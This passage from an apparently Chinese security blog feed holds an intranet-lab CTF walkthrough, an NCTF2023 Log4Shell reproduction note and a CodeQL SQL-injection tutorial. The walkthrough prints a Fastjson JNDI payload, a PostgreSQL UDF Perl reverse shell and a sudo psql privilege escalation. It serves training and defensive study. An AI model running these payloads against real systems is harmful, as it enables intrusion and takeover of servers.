class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">./fscan* -h 172.30.12.0/24 -p 1-65535</span><br><span class="line"></span><br><span class="line">172.30.12.5    getshell主机</span><br><span class="line"></span><br><span class="line">172.30.12.6  3389 8848</span><br><span class="line"></span><br><span class="line">172.30.12.236 8009 8080 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] WebTitle: http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found</span><br><span class="line">[+] http://172.30.12.6:8848 poc-yaml-alibaba-nacos </span><br><span class="line">[+] http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass</span><br><span class="line"></span><br><span class="line">[*] WebTitle: http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台</span><br></pre></td></tr></table></figure><p>发现了个nacos  还是存在poc的  但是这个没啥用  rce不了  于是去Google了一下</p><p><img src="../images/image-20240114181101593.png" alt="image-20240114181101593"></p><p>找到了这个  snakeyaml反序列化</p><p>然后去找工具来打就行了</p><blockquote><p>nacos实现rce有两种方法,一种是SnakeYaml反序列化,一种是Hessian 反序列化漏洞<br>但是Hessian 反序列化漏洞2.0.0 &lt;= Nacos &lt; 2.2.3 任意模式启动才受到影响,这里是1.4.1没受到影响<br>所以用SnakeYaml反序列化<br><a href="https://github.com/artsploit/yaml-payload/">https://github.com/artsploit/yaml-payload/</a></p></blockquote><p><img src="../images/image-20240114181244340.png" alt="image-20240114181244340"></p><p>然后重新编译生成jar包就行  (记得用jdk8)</p><p><img src="../images/image-20240114181315443.png" alt="image-20240114181315443"></p><p>执行后RDP上去  就可以拿到第二个flag了</p><p><img src="../images/image-20240114181412591.png" alt="image-20240114181412591"></p><p>这个东西不是域的  所以接着看另一个ip</p><p>因为我看到题目提示了个fastjson  然后我就猜测是打fastjson的</p><p><img src="../images/image-20240114181500643.png" alt="image-20240114181500643"></p><p>然后再看另一个ip的两个端口</p><blockquote><p>172.30.12.236 8009 8080 </p></blockquote><p>搜了一下发现是tomcat的任意文件读取  (可以读取fastjson的依赖   1.2.45)</p><p>然后直接打就行了</p><p><img src="../images/image-20240114181704634.png" alt="image-20240114181704634"></p><p><img src="../images/image-20240114181716453.png" alt="image-20240114181716453"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123; &quot;name&quot;: &#123;   &quot;@type&quot;: &quot;java.lang.Class&quot;,&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;,&quot;x&quot;: &#123;   &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,   &quot;dataSourceName&quot;: &quot;rmi://172.30.12.5:1099/psrrch&quot;,   &quot;autoCommit&quot;: true &#125;&#125;</span><br></pre></td></tr></table></figure><p>然后shell弹上去之后</p><p>发现是存在两个网卡</p><p>fscan扫一下  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.30.54.179   is alive</span><br><span class="line">(icmp) Target 172.30.54.12    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 2</span><br><span class="line">172.30.54.12:22 open</span><br><span class="line">172.30.54.179:22 open</span><br><span class="line">172.30.54.12:3000 open</span><br><span class="line">172.30.54.12:5432 open</span><br><span class="line">172.30.54.179:8009 open</span><br><span class="line">172.30.54.179:8080 open</span><br><span class="line">172.30.54.179:44401 open</span><br><span class="line">[*] alive ports len is: 7</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login</span><br><span class="line">[*] WebTitle: http://172.30.54.12:3000/login code:200 len:27909  title:Grafana</span><br><span class="line">[*] WebTitle: http://172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240114181939760.png" alt="image-20240114181939760"></p><p>弱口令 admin/admin登录上去后  这个存在一个任意文件读取的漏洞  (版本8.3.0)</p><p><img src="../images/image-20240114182044614.png" alt="image-20240114182044614"></p><p>然后去github上找个自动化工具来打一下</p><p><a href="https://github.com/A-D-Team/grafanaExp/releases">https://github.com/A-D-Team/grafanaExp/releases</a></p><p><img src="../images/image-20240114182313739.png" alt="image-20240114182313739"></p><p>然后登录上去  用创建函数的方法来反弹shell     (这里的权限高)</p><p><img src="../images/image-20240114182503870.png" alt="image-20240114182503870"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, &#x27;system&#x27; LANGUAGE &#x27;c&#x27; STRICT;</span><br><span class="line">select system(&#x27;perl -e \&#x27;use Socket;$i=&quot;172.30.54.179&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27;);</span><br></pre></td></tr></table></figure><p>然后这里改掉psql数据库root用户的密码(接下来提权要用到)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER root WITH PASSWORD &#x27;Admin@123&#x27;;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240114182707666.png" alt="image-20240114182707666"></p><p>这里记得要命令交互  不然等会提权会卡住 不成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240114182747502.png" alt="image-20240114182747502"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/local/postgresql/bin/psql</span><br><span class="line">\?</span><br><span class="line">!/bin/bash</span><br><span class="line">cat /root/flag/flag04.txt</span><br></pre></td></tr></table></figure><p>然后就可以了</p><p><img src="../images/image-20240114182802163.png" alt="image-20240114182802163"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考   &lt;a href=&quot;https://www.cnblogs.com/thebeastofwar/p/17939471&quot;&gt;https://www.cnblogs.com/thebeastofwar/p/17939471&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;先用fscan扫一下&lt;/p</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2023-Web复现</title>
    <link href="https://ke1nys.github.io/posts/c361a29.html"/>
    <id>https://ke1nys.github.io/posts/c361a29.html</id>
    <published>2023-12-30T13:48:32.000Z</published>
    <updated>2024-01-20T15:32:19.403Z</updated>
    
    <content type="html"><![CDATA[<p>这个是南邮的校赛  看了看发现题目质量不错 就来复现一下</p><p><a href="https://github.com/X1cT34m/NCTF2023/tree/main">https://github.com/X1cT34m/NCTF2023/tree/main</a></p><p>web题目都给了docker可以自行复现</p><p>xz师傅写的wp  <a href="https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#logging">https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#logging</a></p><h2 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h2><p>这个题其实就是打jndi注入  考察的CVE是这个<strong>CVE-2021-44228</strong></p><p>其实去看了眼这个CVE 就会发现想要触发JNDI注入的话  是需要这个logger.xxxx方法的</p><p>这道题的话就可以采用使用springboot控制台报错的方法来获取到logger方法来执行JNDI注入</p><p>(因为springboot控制台报错的话会使用logger来输入日志  这样的话就会执行我们的JDNI注入了) </p><p><img src="../images/image-20231230222028712.png" alt="image-20231230222028712"></p><p>然后通过Accept来构造畸形请求头来使springboot报错<strong>(在host处也行  但是这个只能用一次  因为logger就只打印一次)</strong></p><p><img src="../images/image-20231230222136825.png" alt="image-20231230222136825"></p><p><img src="../images/image-20231230222147164.png" alt="image-20231230222147164"></p><p>这样就可以了</p><h2 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个是南邮的校赛  看了看发现题目质量不错 就来复现一下&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/X1cT34m/NCTF2023/tree/main&quot;&gt;https://github.com/X1cT34m/NCTF2023/tree/main</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://ke1nys.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL-学习</title>
    <link href="https://ke1nys.github.io/posts/dc43e171.html"/>
    <id>https://ke1nys.github.io/posts/dc43e171.html</id>
    <published>2023-12-28T13:03:12.000Z</published>
    <updated>2024-01-20T15:32:19.400Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/web/283795.html">https://www.freebuf.com/articles/web/283795.html</a>  (主要参考)</p><p><a href="https://github.com/Firebasky/CodeqlLearn">https://github.com/Firebasky/CodeqlLearn</a></p><h1 id="粗糙的数据库生成"><a href="#粗糙的数据库生成" class="headerlink" title="粗糙的数据库生成"></a>粗糙的数据库生成</h1><p>这里生成数据库的方法我用的是这个项目</p><p><a href="https://github.com/ice-doom/codeql_compile">https://github.com/ice-doom/codeql_compile</a></p><p>根据java源码构建数据库的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create &quot;D:\google download\cc_database&quot; --language=&quot;java&quot; --source-root=&quot;D:\google download\micro_service_seclab-main&quot;  --overwrite</span><br></pre></td></tr></table></figure><p>这里我用的例子是jar包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python .\codeql_compile.py -a D:\codeql_compile\ezjava.jar  -d D:\codeql_compile\ezjava\BOOT-INF\lib</span><br><span class="line"></span><br><span class="line">codeql database create D:\codeql_compile\demo-database --language=<span class="string">&quot;java&quot;</span> --source-root=D:\codeql_compile\ezjava.jar_save_1703684740 --command=<span class="string">&quot;run.cmd&quot;</span></span><br></pre></td></tr></table></figure><p>一共两步就成功生成了数据库</p><p>然后导入数据库</p><p><img src="../images/image-20231228213705367.png" alt="image-20231228213705367"></p><p>先创建个文件夹  然后导入ql文件</p><p><img src="../images/image-20231228213941385.png" alt="image-20231228213941385"></p><p><code>qlpack.yml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name: example-query</span><br><span class="line">version: 0.0.0</span><br><span class="line">libraryPathDependencies: codeql-java</span><br></pre></td></tr></table></figure><p>然后写ql文件就行了</p><h1 id="QL语言编写"><a href="#QL语言编写" class="headerlink" title="QL语言编写"></a>QL语言编写</h1><h2 id="基础查询"><a href="#基础查询" class="headerlink" title="基础查询"></a>基础查询</h2><h3 id="先是查询数据库中所有的类方法"><a href="#先是查询数据库中所有的类方法" class="headerlink" title="先是查询数据库中所有的类方法"></a>先是查询数据库中所有的类方法</h3><p>这里的话是使用<code>Method</code>这个来进行查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Method method</span><br><span class="line">select method</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228214509935.png" alt="image-20231228214509935"></p><p>查出数据库中所有函数方法</p><hr><h3 id="指定查询某个方法"><a href="#指定查询某个方法" class="headerlink" title="指定查询某个方法"></a>指定查询某个方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(<span class="string">&quot;resolveClass&quot;</span>)</span><br><span class="line">select method</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228214630394.png" alt="image-20231228214630394"></p><p>如果要把其是什么类查询出来的化  就再加上一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(&quot;resolveClass&quot;)</span><br><span class="line">select method,method.getDeclaringType()</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228214746369.png" alt="image-20231228214746369"></p><hr><h3 id="查询父类中子类的某个方法"><a href="#查询父类中子类的某个方法" class="headerlink" title="查询父类中子类的某个方法"></a>查询父类中子类的某个方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(&quot;resolveClass&quot;) and method.getDeclaringType().getASupertype().hasQualifiedName(&quot;java.io&quot;, &quot;ObjectInputStream&quot;)</span><br><span class="line">select method, method.getDeclaringType()</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228215047751.png" alt="image-20231228215047751"></p><p>这里的话是查询<code>ObjectInputStream</code>这个父类中子类的<code>resolveClass</code>方法  这里的话就会有个疑问就是 他只能查询到隔一级的子类  隔两级的子类的resolveClass方法是查不到的</p><h3 id="查询某个类中的某个方法被谁调用"><a href="#查询某个类中的某个方法被谁调用" class="headerlink" title="查询某个类中的某个方法被谁调用"></a>查询某个类中的某个方法被谁调用</h3><p>Call和Callable</p><p>Callable表示可调用的方法或构造器的集合。</p><p>Call表示调用Callable的这个过程（方法调用，构造器调用等等）</p><p>过滤 方法调用</p><p>MethodAccess</p><p>一般是先查<code>method</code>，与<code>MethodAccess.getMethod()</code> 进行比较。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"></span><br><span class="line">from MethodAccess call, Method method</span><br><span class="line">where method.hasName(<span class="string">&quot;resolveClass&quot;</span>) and method.getDeclaringType().getAnAncestor().hasQualifiedName(<span class="string">&quot;java.io&quot;</span>, <span class="string">&quot;ObjectInputStream&quot;</span>) and call.getMethod() = method</span><br><span class="line">select call</span><br></pre></td></tr></table></figure><p>这个是查找<code>resolveClass</code>这个方法被调用情况  我这样查是能查到  但是只能查父类下面差一级的子类</p><h3 id="谓词-可以理解为函数"><a href="#谓词-可以理解为函数" class="headerlink" title="谓词(可以理解为函数)"></a>谓词(可以理解为函数)</h3><p>和SQL一样，where部分的查询条件如果过长，会显得很乱。CodeQL提供一种机制可以让你把很长的查询语句封装成函数。</p><p>这个函数，就叫谓词。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java</span><br><span class="line"> </span><br><span class="line">predicate <span class="title function_">isStudent</span><span class="params">(Method method)</span> &#123;</span><br><span class="line">exists(|method.hasName(<span class="string">&quot;getStudent&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">where <span class="title function_">isStudent</span><span class="params">(method)</span></span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231229145822767.png" alt="image-20231229145822767"></p><blockquote><p>语法解释</p><p>predicate 表示当前方法没有返回值。</p><p>exists子查询，是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回true or false，来决定筛选出哪些数据。</p></blockquote><h3 id="设置Source和Sink"><a href="#设置Source和Sink" class="headerlink" title="设置Source和Sink"></a>设置Source和Sink</h3><blockquote><p>什么是source和sink</p><p>在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。</p><p>source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</p><p>sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</p><p>sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。</p></blockquote><p>只有当source和sink同时存在，并且从source到sink的链路是通的，才表示当前漏洞是存在的。</p><p><img src="../images/1628394339_610f53637de77e9114e4f.jpg!small" alt="image"></p><h4 id="设置source"><a href="#设置source" class="headerlink" title="设置source"></a>设置source</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123;&#125;</span><br></pre></td></tr></table></figure><p>我们使用的是<code>Spring Boot</code>框架，<strong>那么source就是http参数入口的代码参数</strong>，在下面的代码中，source就是username：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/one&quot;)</span><br><span class="line">public List&lt;Student&gt; one(@RequestParam(value = &quot;username&quot;) String username) &#123;</span><br><span class="line">    return indexLogic.getStudent(username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在下面的代码中，source就是<code>Student user</code>(user为Student类型，这个不受影响)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(value = &quot;/object&quot;)</span><br><span class="line">public List&lt;Student&gt; objectParam(@RequestBody Student user) &#123;</span><br><span class="line">    return indexLogic.getStudent(user.getUsername());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在下面的代码中，source就是<code>Student user</code>(user为Student类型，这个不受影响)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(value = &quot;/object&quot;)</span><br><span class="line">public List&lt;Student&gt; objectParam(@RequestBody Student user) &#123;</span><br><span class="line">    return indexLogic.getStudent(user.getUsername());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Source设置的代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br></pre></td></tr></table></figure><p>这是<code>SDK</code>自带的规则，里面包含了大多常用的Source入口。我们使用的SpringBoot也包含在其中, 我们可以直接使用。</p><p><code>instanceof</code>是codeql自带的语法</p><p>当然了上述语句并不是 完整可使用的语句  这是把我们等会完全的语句拿出部分进行解释讲解</p><h4 id="设置sink"><a href="#设置sink" class="headerlink" title="设置sink"></a>设置sink</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在本案例中，我们的sink应该为<code>query</code>方法(Method)的调用(MethodAccess)，所以我们设置Sink为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">exists(Method method, MethodAccess call |</span><br><span class="line">  method.hasName(&quot;query&quot;)</span><br><span class="line">  and</span><br><span class="line">  call.getMethod() = method and</span><br><span class="line">  sink.asExpr() = call.getArgument(0)</span><br><span class="line">)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个语句中 call方法就是我们上文提到的   就是可以查询某个方法被谁调用了</p><p>注：以上代码使用了exists子查询语法，格式为exists(Obj obj| somthing), 上面查询的意思为：查找一个query()方法的调用点，<strong>并把它的第一个参数设置为sink</strong>  (加黑的这句话就是上述代码中最后一段的解释)</p><p>在靶场系统(<code>micro-service-seclab</code>)中，sink就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdbcTemplate.query(sql, ROW_MAPPER);</span><br><span class="line"></span><br><span class="line">//提前说明一下</span><br></pre></td></tr></table></figure><p>因为我们测试的注入漏洞，当source变量流入这个方法的时候，才会发生注入漏洞！</p><p>当然了上述语句并不是 完整可使用的语句  这是把我们等会完全的语句拿出部分进行解释讲解</p><h3 id="Flow数据流"><a href="#Flow数据流" class="headerlink" title="Flow数据流"></a>Flow数据流</h3><p>设置好Source和Sink，就相当于搞定了首尾，但是首尾是否能够连通才能决定是否存在漏洞！</p><p>一个受污染的变量，能够毫无阻拦的流转到危险函数，就表示存在漏洞！</p><p>这个连通工作就是CodeQL引擎本身来完成的。我们通过使用<code>config.hasFlowPath(source, sink)</code>方法来判断是否连通。</p><p>比如如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>我们传递给<code>config.hasFlowPath(source, sink)</code>我们定义好的source和sink，系统就会自动帮我们判断是否存在漏洞了。</p><h3 id="Source和sink配合查询结果"><a href="#Source和sink配合查询结果" class="headerlink" title="Source和sink配合查询结果"></a>Source和sink配合查询结果</h3><p>在CodeQL中，我们使用官方提供的TaintTracking::Configuration方法定义source和sink，至于中间是否是通的，这个后面使用CodeQL提供的<code>config.hasFlowPath(source, sink)</code>来帮我们处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this = &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call |</span><br><span class="line">      method.hasName(&quot;query&quot;)</span><br><span class="line">      and</span><br><span class="line">      call.getMethod() = method and</span><br><span class="line">      sink.asExpr() = call.getArgument(0)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>CodeQL语法和Java类似，extends代表集成父类TaintTracking::Configuration。</p><p>这个类是官方提供用来做数据流分析的通用类，提供很多数据流分析相关的方法，比如isSource(定义source)，isSink(定义sink)</p><p>src instanceof RemoteFlowSource 表示src 必须是 RemoteFlowSource类型。在RemoteFlowSource里，官方提供很非常全的source定义，我们本次用到的Springboot的Source就已经涵盖了。</p></blockquote><p>最终demo.ql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name Sql-Injection</span><br><span class="line"> * @description Sql-Injection</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this = &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call |</span><br><span class="line">      method.hasName(&quot;query&quot;)</span><br><span class="line">      and</span><br><span class="line">      call.getMethod() = method and</span><br><span class="line">      sink.asExpr() = call.getArgument(0)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>注：上面的注释和其它语言是不一样的，不能够删除，它是程序的一部分，因为在我们生成测试报告的时候，上面注释当中的name，description等信息会写入到审计报告中。</p><p><strong>(这个不能删  如果删了话再执行 就会生成不了下图中的alerts 不能清楚的看到source和sink之间的node了)</strong></p><p><img src="../images/image-20231229152906287.png" alt="image-20231229152906287"></p><h3 id="上述查询误报解决"><a href="#上述查询误报解决" class="headerlink" title="上述查询误报解决"></a>上述查询误报解决</h3><p><img src="../images/image-20231229153553428.png" alt="image-20231229153553428"></p><p>在上述跑出的链子中 跑出sink是这个东西  但是呢这个参数是long类型的  不可能存在sql注入</p><p>这说明我们的规则里，对于List<Long>，甚至List<Integer>类型都会产生误报，source误把这种类型的参数涵盖了。</p><p>我们需要采取手段消除这种误报。</p><p>这个手段就是<code>isSanitizer</code>。</p><p><img src="../images/1628394471_610f53e70361d448d1bbe.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">isSanitizer是CodeQL的类TaintTracking::Configuration提供的净化方法。它的函数原型是：</span><br><span class="line"></span><br><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;&#125;</span><br><span class="line">覆盖谓词 isSanitizer(DataFlow::Node 节点) &#123;&#125;</span><br><span class="line"></span><br><span class="line">在CodeQL自带的默认规则里，对当前节点是否为基础类型做了判断。</span><br><span class="line"></span><br><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">覆盖谓词 isSanitizer(DataFlow::Node 节点) &#123;</span><br><span class="line">node.getType() instanceof PrimitiveType or</span><br><span class="line">node.getType() instanceof BoxedType or</span><br><span class="line">node.getType() instanceof NumberType</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于CodeQL检测SQL注入里的<code>isSanitizer</code>方法，只对基础类型做了判断，并没有对这种复合类型做判断，才引起了这次误报问题。</p><p>那我们只需要将这种复合类型加入到isSanitizer方法，即可消除这种误报。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 